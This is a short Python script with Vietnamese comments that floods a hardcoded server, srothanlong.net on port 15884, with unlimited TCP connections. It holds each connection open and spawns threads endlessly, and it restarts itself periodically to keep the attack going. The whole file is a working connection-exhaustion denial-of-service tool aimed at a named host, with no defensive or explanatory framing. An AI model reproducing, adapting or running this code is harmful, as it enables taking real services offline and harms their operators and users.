import threading
import socket
import time
import os
import sys

# Hàm để tạo kết nối
def create_connection(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        print(f"Kết nối thành công đến {host}:{port}")
        while True:
            time.sleep(6000)  # Giữ kết nối
    except Exception as e:
        print(f"Lỗi kết nối: {e}")

# Hàm để tạo nhiều luồng kết nối không giới hạn
def unlimited_connections(host, port):
    while True:
        t = threading.Thread(target=create_connection, args=(host, port))
        t.start()
        # time.sleep(0.1)  # Gửi 5 yêu cầu mỗi giây

if __name__ == "__main__":
    host = "srothanlong.net"  # Địa chỉ IP của máy chủ
    port = 15884           # Cổng của máy chủ

    while True:
        p = threading.Thread(target=unlimited_connections, args=(host, port))
        p.start()
        time.sleep(100)  # Chờ 10 phút
        print("Khởi động lại chương trình...")
        os.execv(sys.executable, ['python'] + sys.argv)
